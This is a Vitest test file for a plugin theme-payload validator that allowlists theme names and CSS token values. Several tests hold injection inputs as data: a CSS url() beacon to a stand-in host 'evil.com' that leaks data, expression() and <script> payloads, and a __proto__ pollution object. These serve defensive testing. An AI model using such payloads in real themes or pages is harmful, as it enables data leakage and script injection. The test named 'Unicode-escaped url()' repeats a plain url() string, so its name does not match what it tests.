import { describe, it, expect } from "vitest";
import { validateThemePayload } from "../domains/plugins.js";

describe("validateThemePayload", () => {
  it("accepts a valid dark/purple/dark payload", () => {
    const result = validateThemePayload({ theme: "dark", chatTheme: "purple", codeTheme: "dark" });
    expect(result).toEqual({ ok: true, safe: { theme: "dark", chatTheme: "purple", codeTheme: "dark" } });
  });

  it("accepts light/default/light", () => {
    const result = validateThemePayload({ theme: "light", chatTheme: "default", codeTheme: "light" });
    expect(result.ok).toBe(true);
  });

  it("accepts high-contrast", () => {
    const result = validateThemePayload({ theme: "high-contrast", chatTheme: "blue", codeTheme: "dark" });
    expect(result.ok).toBe(true);
  });

  it("rejects null", () => {
    const result = validateThemePayload(null);
    expect(result).toEqual({ ok: false, error: "invalid-payload" });
  });

  it("rejects non-object", () => {
    expect(validateThemePayload("dark")).toEqual({ ok: false, error: "invalid-payload" });
  });

  it("rejects unknown theme value", () => {
    const result = validateThemePayload({ theme: "sepia", chatTheme: "default", codeTheme: "light" });
    expect(result).toEqual({ ok: false, error: "invalid-theme" });
  });

  it("rejects unknown chatTheme value", () => {
    const result = validateThemePayload({ theme: "dark", chatTheme: "red", codeTheme: "dark" });
    expect(result).toEqual({ ok: false, error: "invalid-chat-theme" });
  });

  it("rejects unknown codeTheme value", () => {
    const result = validateThemePayload({ theme: "dark", chatTheme: "default", codeTheme: "auto" });
    expect(result).toEqual({ ok: false, error: "invalid-code-theme" });
  });

  it("rejects extra injected fields — safe output has only theme/chatTheme/codeTheme keys", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "default", codeTheme: "dark",
      evil: "injected", __proto__: { polluted: true },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.theme).toBe("dark");
      expect(result.safe.chatTheme).toBe("default");
      expect(result.safe.codeTheme).toBe("dark");
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("passes through valid --lvis-* tokens", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "lg", codeTheme: "dark",
      tokens: { "--lvis-bg": "hsl(0, 0%, 15%)", "--lvis-primary": "#734dff" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({ "--lvis-bg": "hsl(0, 0%, 15%)", "--lvis-primary": "#734dff" });
    }
  });

  it("drops token keys not in the closed PLUGIN_TOKEN_NAMES allowlist", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "default", codeTheme: "dark",
      tokens: { "--lvis-bg": "#fff", "--lvis-unknown-new": "#abc", "--evil-key": "red", "color": "blue" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({ "--lvis-bg": "#fff" });
    }
  });

  it("drops token values with url() injection", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "default", codeTheme: "dark",
      tokens: { "--lvis-bg": "url(https://evil.com?leak=1)" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("drops token values with expression() injection", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "default", codeTheme: "dark",
      tokens: { "--lvis-bg": "expression(alert(1))" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("drops token values with HTML tag injection", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "default", codeTheme: "dark",
      tokens: { "--lvis-bg": "<script>x</script>" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("does not include tokens key when all token entries are invalid", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "default", codeTheme: "dark",
      tokens: { "--evil": "red" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("accepts tokens=undefined gracefully", () => {
    const result = validateThemePayload({ theme: "dark", chatTheme: "default", codeTheme: "dark" });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("drops token values with Unicode-escaped url() — allowlist blocks bypass attempts", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "default", codeTheme: "dark",
      tokens: { "--lvis-bg": "url(https://evil.com?leak=1)" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("drops var() references — only literal HSL/hex/dimension values pass", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "default", codeTheme: "dark",
      tokens: { "--lvis-bg": "var(--p-secret-color)" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toBeUndefined();
    }
  });

  it("accepts hsl with decimal values and hex colors", () => {
    const result = validateThemePayload({
      theme: "dark", chatTheme: "lg", codeTheme: "dark",
      tokens: { "--lvis-radius": "0.6rem", "--lvis-radius-sm": "0.25rem", "--lvis-primary": "#734dff" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({ "--lvis-radius": "0.6rem", "--lvis-radius-sm": "0.25rem", "--lvis-primary": "#734dff" });
    }
  });
});
